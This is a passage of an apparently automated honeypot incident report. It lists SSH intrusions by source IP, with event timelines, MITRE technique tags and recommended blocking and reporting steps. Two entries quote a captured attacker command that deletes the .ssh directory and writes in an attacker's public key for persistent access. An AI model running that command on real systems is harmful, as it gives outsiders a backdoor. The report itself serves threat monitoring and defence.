| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:04:10` | `cowrie.session.connect` |
| `2026-07-22 22:04:10` | `cowrie.client.version` |
| `2026-07-22 22:04:10` | `cowrie.client.kex` |
| `2026-07-22 22:04:10` | `cowrie.login.success` |
| `2026-07-22 22:04:11` | `cowrie.session.params` |
| `2026-07-22 22:04:11` | `cowrie.command.input` |
| `2026-07-22 22:04:11` | `cowrie.command.failed` |
| `2026-07-22 22:04:11` | `cowrie.log.closed` |
| `2026-07-22 22:04:11` | `cowrie.session.params` |
| `2026-07-22 22:04:11` | `cowrie.command.input` |
| `2026-07-22 22:04:12` | `cowrie.session.file_download` |
| `2026-07-22 22:04:12` | `cowrie.log.closed` |
| `2026-07-22 22:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.254[.]143` to AbuseIPDB if not already reported
- [ ] Block `165.154.254[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b0b411c12cd

| Field | Detail |
|---|---|
| **Source IP** | `165.154.254[.]143` |
| **First Seen** | 2026-07-22 22:04 |
| **Last Seen** | 2026-07-22 22:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:04:12` | `cowrie.session.connect` |
| `2026-07-22 22:04:12` | `cowrie.client.version` |
| `2026-07-22 22:04:12` | `cowrie.client.kex` |
| `2026-07-22 22:04:12` | `cowrie.login.success` |
| `2026-07-22 22:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.254[.]143` to AbuseIPDB if not already reported
- [ ] Block `165.154.254[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fbabb9907c8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.254[.]143` |
| **First Seen** | 2026-07-22 22:04 |
| **Last Seen** | 2026-07-22 22:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:04:12` | `cowrie.session.connect` |
| `2026-07-22 22:04:12` | `cowrie.client.version` |
| `2026-07-22 22:04:12` | `cowrie.client.kex` |
| `2026-07-22 22:04:12` | `cowrie.login.success` |
| `2026-07-22 22:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.254[.]143` to AbuseIPDB if not already reported
- [ ] Block `165.154.254[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7855b50d00bc

| Field | Detail |
|---|---|
| **Source IP** | `220.128.137[.]164` |
| **First Seen** | 2026-07-22 22:05 |
| **Last Seen** | 2026-07-22 22:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:05:39` | `cowrie.session.connect` |
| `2026-07-22 22:05:40` | `cowrie.client.version` |
| `2026-07-22 22:05:40` | `cowrie.client.kex` |
| `2026-07-22 22:05:43` | `cowrie.login.success` |
| `2026-07-22 22:05:43` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:05:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.128.137[.]164` to AbuseIPDB if not already reported
- [ ] Block `220.128.137[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-676f44e7c7f3

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-07-22 22:17 |
| **Last Seen** | 2026-07-22 22:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:17:17` | `cowrie.session.connect` |
| `2026-07-22 22:17:17` | `cowrie.client.version` |
| `2026-07-22 22:17:17` | `cowrie.client.kex` |
| `2026-07-22 22:17:19` | `cowrie.login.success` |
| `2026-07-22 22:17:19` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0453bcda8771

| Field | Detail |
|---|---|
| **Source IP** | `183.167.234[.]154` |
| **First Seen** | 2026-07-22 22:17 |
| **Last Seen** | 2026-07-22 22:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:17:29` | `cowrie.session.connect` |
| `2026-07-22 22:17:30` | `cowrie.client.version` |
| `2026-07-22 22:17:30` | `cowrie.client.kex` |
| `2026-07-22 22:17:32` | `cowrie.login.success` |
| `2026-07-22 22:17:32` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.234[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.167.234[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-370aae3d17eb

| Field | Detail |
|---|---|
| **Source IP** | `136.185.6[.]181` |
| **First Seen** | 2026-07-22 22:17 |
| **Last Seen** | 2026-07-22 22:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:17:51` | `cowrie.session.connect` |
| `2026-07-22 22:17:51` | `cowrie.client.version` |
| `2026-07-22 22:17:51` | `cowrie.client.kex` |
| `2026-07-22 22:17:53` | `cowrie.login.success` |
| `2026-07-22 22:17:53` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.185.6[.]181` to AbuseIPDB if not already reported
- [ ] Block `136.185.6[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f3911d2d1c2

| Field | Detail |
|---|---|
| **Source IP** | `87.225.108[.]138` |
| **First Seen** | 2026-07-22 22:17 |
| **Last Seen** | 2026-07-22 22:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:17:58` | `cowrie.session.connect` |
| `2026-07-22 22:17:59` | `cowrie.client.version` |
| `2026-07-22 22:17:59` | `cowrie.client.kex` |
| `2026-07-22 22:18:00` | `cowrie.login.success` |
| `2026-07-22 22:18:01` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.225.108[.]138` to AbuseIPDB if not already reported
- [ ] Block `87.225.108[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-821b4fb64dcf

| Field | Detail |
|---|---|
| **Source IP** | `201.28.237[.]90` |
| **First Seen** | 2026-07-22 22:17 |
| **Last Seen** | 2026-07-22 22:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:17:58` | `cowrie.session.connect` |
| `2026-07-22 22:17:59` | `cowrie.client.version` |
| `2026-07-22 22:17:59` | `cowrie.client.kex` |
| `2026-07-22 22:18:01` | `cowrie.login.success` |
| `2026-07-22 22:18:01` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.237[.]90` to AbuseIPDB if not already reported
- [ ] Block `201.28.237[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b31d6c1a56

| Field | Detail |
|---|---|
| **Source IP** | `217.150.37[.]249` |
| **First Seen** | 2026-07-22 22:18 |
| **Last Seen** | 2026-07-22 22:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:18:10` | `cowrie.session.connect` |
| `2026-07-22 22:18:11` | `cowrie.client.version` |
| `2026-07-22 22:18:11` | `cowrie.client.kex` |
| `2026-07-22 22:18:13` | `cowrie.login.success` |
| `2026-07-22 22:18:14` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:18:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.150.37[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.150.37[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eba8392aefb

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]52` |
| **First Seen** | 2026-07-22 22:21 |
| **Last Seen** | 2026-07-22 22:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:21:12` | `cowrie.session.connect` |
| `2026-07-22 22:21:12` | `cowrie.client.version` |
| `2026-07-22 22:21:12` | `cowrie.client.kex` |
| `2026-07-22 22:21:14` | `cowrie.login.success` |
| `2026-07-22 22:21:14` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]52` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb6ec85251d

| Field | Detail |
|---|---|
| **Source IP** | `171.217.70[.]151` |
| **First Seen** | 2026-07-22 22:26 |
| **Last Seen** | 2026-07-22 22:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:26:37` | `cowrie.session.connect` |
| `2026-07-22 22:26:37` | `cowrie.client.version` |
| `2026-07-22 22:26:37` | `cowrie.client.kex` |
| `2026-07-22 22:26:39` | `cowrie.login.success` |
| `2026-07-22 22:26:40` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.217.70[.]151` to AbuseIPDB if not already reported
- [ ] Block `171.217.70[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc638a356cd

| Field | Detail |
|---|---|
| **Source IP** | `58.215.243[.]6` |
| **First Seen** | 2026-07-22 22:26 |
| **Last Seen** | 2026-07-22 22:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:26:45` | `cowrie.session.connect` |
| `2026-07-22 22:26:46` | `cowrie.client.version` |
| `2026-07-22 22:26:46` | `cowrie.client.kex` |
| `2026-07-22 22:26:48` | `cowrie.login.success` |
| `2026-07-22 22:26:49` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.215.243[.]6` to AbuseIPDB if not already reported
- [ ] Block `58.215.243[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73e2b48b1493

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 22:27 |
| **Last Seen** | 2026-07-22 22:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:27:03` | `cowrie.session.connect` |
| `2026-07-22 22:27:04` | `cowrie.client.version` |
| `2026-07-22 22:27:04` | `cowrie.client.kex` |
| `2026-07-22 22:27:05` | `cowrie.login.success` |
| `2026-07-22 22:27:06` | `cowrie.session.params` |
| `2026-07-22 22:27:06` | `cowrie.command.input` |
| `2026-07-22 22:27:06` | `cowrie.log.closed` |
| `2026-07-22 22:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc4092e4d43d

| Field | Detail |
|---|---|
| **Source IP** | `183.223.156[.]154` |
| **First Seen** | 2026-07-22 22:29 |
| **Last Seen** | 2026-07-22 22:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:29:59` | `cowrie.session.connect` |
| `2026-07-22 22:30:00` | `cowrie.client.version` |
| `2026-07-22 22:30:00` | `cowrie.client.kex` |
| `2026-07-22 22:30:03` | `cowrie.login.success` |
| `2026-07-22 22:30:04` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.223.156[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.223.156[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee2933cb3017

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-07-22 22:30 |
| **Last Seen** | 2026-07-22 22:30 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:30:07` | `cowrie.session.connect` |
| `2026-07-22 22:30:07` | `cowrie.client.version` |
| `2026-07-22 22:30:07` | `cowrie.client.kex` |
| `2026-07-22 22:30:08` | `cowrie.login.success` |
| `2026-07-22 22:30:09` | `cowrie.session.params` |
| `2026-07-22 22:30:09` | `cowrie.command.input` |
| `2026-07-22 22:30:09` | `cowrie.command.failed` |
| `2026-07-22 22:30:09` | `cowrie.log.closed` |
| `2026-07-22 22:30:09` | `cowrie.session.params` |
| `2026-07-22 22:30:09` | `cowrie.command.input` |
| `2026-07-22 22:30:10` | `cowrie.session.file_download` |
| `2026-07-22 22:30:10` | `cowrie.log.closed` |
| `2026-07-22 22:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc444cb41406

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-07-22 22:30 |
| **Last Seen** | 2026-07-22 22:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:30:14` | `cowrie.session.connect` |
| `2026-07-22 22:30:14` | `cowrie.client.version` |
| `2026-07-22 22:30:14` | `cowrie.client.kex` |
| `2026-07-22 22:30:14` | `cowrie.login.success` |
| `2026-07-22 22:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3006cea75aa

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-07-22 22:30 |
| **Last Seen** | 2026-07-22 22:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:30:17` | `cowrie.session.connect` |
| `2026-07-22 22:30:17` | `cowrie.client.version` |
| `2026-07-22 22:30:17` | `cowrie.client.kex` |
| `2026-07-22 22:30:18` | `cowrie.login.success` |
| `2026-07-22 22:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd8dde54da7c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 22:34 |
| **Last Seen** | 2026-07-22 22:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:34:20` | `cowrie.session.connect` |
| `2026-07-22 22:34:20` | `cowrie.client.version` |
| `2026-07-22 22:34:20` | `cowrie.client.kex` |
| `2026-07-22 22:34:22` | `cowrie.login.success` |
| `2026-07-22 22:34:23` | `cowrie.session.params` |
| `2026-07-22 22:34:23` | `cowrie.command.input` |
| `2026-07-22 22:34:24` | `cowrie.log.closed` |
| `2026-07-22 22:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55b82a3d0bad

| Field | Detail |
|---|---|
| **Source IP** | `14.49.197[.]174` |
| **First Seen** | 2026-07-22 22:40 |
| **Last Seen** | 2026-07-22 22:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:40:00` | `cowrie.session.connect` |
| `2026-07-22 22:40:01` | `cowrie.client.version` |
| `2026-07-22 22:40:01` | `cowrie.client.kex` |
| `2026-07-22 22:40:03` | `cowrie.login.success` |
| `2026-07-22 22:40:04` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:40:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.49.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `14.49.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-621b7549b3f7

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-07-22 22:40 |
| **Last Seen** | 2026-07-22 22:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:40:13` | `cowrie.session.connect` |
| `2026-07-22 22:40:14` | `cowrie.client.version` |
| `2026-07-22 22:40:14` | `cowrie.client.kex` |
| `2026-07-22 22:40:15` | `cowrie.login.success` |
| `2026-07-22 22:40:16` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5faad7d1f6f5

| Field | Detail |
|---|---|
| **Source IP** | `210.13.99[.]66` |
| **First Seen** | 2026-07-22 22:42 |
| **Last Seen** | 2026-07-22 22:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:42:12` | `cowrie.session.connect` |
| `2026-07-22 22:42:13` | `cowrie.client.version` |
| `2026-07-22 22:42:13` | `cowrie.client.kex` |
| `2026-07-22 22:42:15` | `cowrie.login.success` |
| `2026-07-22 22:42:16` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.13.99[.]66` to AbuseIPDB if not already reported
- [ ] Block `210.13.99[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd799e5f1686

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]92` |
| **First Seen** | 2026-07-22 22:42 |
| **Last Seen** | 2026-07-22 22:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:42:22` | `cowrie.session.connect` |
| `2026-07-22 22:42:23` | `cowrie.client.version` |
| `2026-07-22 22:42:23` | `cowrie.client.kex` |
| `2026-07-22 22:42:25` | `cowrie.login.success` |
| `2026-07-22 22:42:25` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]92` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ebd1a4ffda9

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-07-22 22:43 |
| **Last Seen** | 2026-07-22 22:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 22:43:14` | `cowrie.session.connect` |
| `2026-07-22 22:43:14` | `cowrie.client.version` |
| `2026-07-22 22:43:14` | `cowrie.client.kex` |
| `2026-07-22 22:43:15` | `cowrie.login.success` |
| `2026-07-22 22:43:15` | `cowrie.direct-tcpip.request` |
| `2026-07-22 22:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fffd3c126dcf

| Field | Detail |
|---|---|
| **Source IP** | `39.164.91[.]67` |
| **First Seen** | 2026-07-22 22:45 |
| **Last Seen** | 2026-07-22 22:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
